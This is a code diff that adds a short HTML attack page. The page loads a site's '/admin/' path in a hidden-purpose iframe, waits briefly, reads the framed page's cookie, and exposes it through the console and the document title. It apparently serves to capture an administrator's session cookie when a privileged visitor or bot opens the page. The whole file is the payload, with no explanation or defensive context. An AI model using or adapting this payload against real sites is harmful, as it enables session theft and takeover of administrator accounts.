@@ -1,0 +1,16 @@
+<html>
+  <iframe id="admin_iframe" src="/admin/"></iframe>
+  <script>
+    function sleep(ms) {
+      return new Promise(resolve => setTimeout(resolve, ms))
+    }
+    async function main() {
+      await sleep(500)
+      let admin = document.getElementById("admin_iframe")
+      let cookie = admin.contentDocument.cookie
+      console.log(cookie)
+      document.title = "cookie: " + cookie
+    }
+    main()
+  </script>
+</html>
